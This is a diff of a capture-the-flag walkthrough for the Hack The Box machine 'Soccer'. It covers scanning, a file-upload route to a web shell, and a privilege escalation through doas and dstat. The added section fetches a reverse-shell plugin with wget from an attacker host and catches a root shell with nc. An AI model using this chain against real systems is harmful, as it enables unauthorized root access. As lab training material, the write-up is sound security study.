@@ -14,12 +14,15 @@ Some Description
     - Exploit Website get Shell
     - Figure out another Website
 - Privilege Escalation
-    - Enumeration 
-    - Exploitation
+    - Enum 
+    - Exploit
+
 ---
 
 ## Information Gathering Stage
+
 ### Nmap Scanning
+
 `map -sV -sC -Pn -v -oN nmap-report_soccer -p- 10.10.11.194`
 
 ```sh
@@ -29,6 +32,8 @@ PORT     STATE SERVICE         VERSION
 9091/tcp open  xmltec-xmlmail?
 
 ```
+
+---
 
 ### Enum Subfolder
 
@@ -56,8 +61,15 @@ Progress: 220534 / 220561 (99.99%)
 ===============================================================
 ```
 
+---
+
 ## Exploit CVE for Vulnerable Version
+
+---
+
 ### Exploit Website get Shell
+
+---
 
 #### UnRestricted File Upload 
 
@@ -86,6 +98,8 @@ Content-Type: text/plain
 ------WebKitFormBoundaryb2kFsZoCHAQcAN7v--
 ```
 
+---
+
 #### Call RCE
 
 ```sh
@@ -96,6 +110,8 @@ Host: soccer.htb
 
 Get shell www-data , but not read user.txt
 Find a way
+
+---
 
 #### Figure out another Website
 
@@ -167,6 +183,8 @@ server {
 
 }
 ```
+
+---
 
 ### Figure out another Website
 
@@ -322,4 +340,87 @@ Table: accounts
 Login with Player and cat file user.txt
 
 user: `********************************`
+
+---
+
+## Privilege Escalation
+
+---
+
+### Enumeration
+
+```sh
+www-data@soccer:/etc/nginx/sites-enabled$ echo $PATH
+
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+$ ls /usr/local/bin
+
+doas  doasedit  vidoas
+
+```
+[What is doas???](https://www.maketecheasier.com/what-is-install-doas/#:~:text=Doas%20is%20a%20privilege%20escalation,systems%20through%20the%20OpenDoas%20program.)
+
+```sh
+$ cat /usr/local/etc/doas.conf
+cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+```
+
+---
+
+### Exploitation
+
+[How to exploit dstat to Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/)
+
+Doas permit nopass player as root do command at /sr/bin/dstat
+
+We are prepare file dstat_exploit.py as plugin in dstat. Dstat_exploit.py is reshell python.
+
+List and backconnect to get root Shell.
+
+```sh
+$ pwd
+/usr/local/share/dstat
+
+$ wget 10.10.14.55:1338/dstat_exploit.py
+wget 10.10.14.55:1338/dstat_exploit.py --2023-04-26 01:43:27--  http://10.10.14.55:1338/dstat_exploit.py
+Connecting to 10.10.14.55:1338... connected.
+HTTP request sent, awaiting response... 200 OK
+Saving to: â€˜dstat_exploit.pyâ€™
+
+dstat_exploit.py    100%[===================>] 200 OK
+
+$ dstat --list | grep exploit
+dstat --list | grep exploit
+        exploit     
+
+```
+
+Prepare is done, run listen `nc -nlvp 9001 ` and run command as root from player user.
+
+```sh
+$/usr/local/bin/doas -u root /usr/bin/dstat --exploit
+```
+
+Rooted
+
+```sh
+nc -nlvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.55] from (UNKNOWN) [10.10.11.194] 33450
+# whoami
+root
+# ls
+# pwd
+/usr/local/share/dstat
+# cd /root
+# ls
+app  root.txt  run.sql  snap
+# cat root.txt
+cat root.txt
+c1****************************0d
+
+```
+
 
